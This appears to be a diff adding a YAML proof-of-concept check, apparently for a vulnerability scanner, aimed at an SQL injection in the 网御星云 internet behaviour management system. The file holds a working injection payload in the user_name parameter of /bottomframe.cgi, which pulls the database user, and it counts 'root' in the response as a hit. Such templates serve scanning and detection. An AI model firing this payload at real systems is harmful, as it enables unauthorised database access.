@@ -1,0 +1,9 @@
+name: poc-yaml-网御星云-上网行为管理系统-sql
+description: "SQL注入"
+method: GET
+path:
+  - "/bottomframe.cgi?user_name=%27))%20union%20select%20user()%23"
+expression:
+  status: 200
+  body_all:
+    - "root"
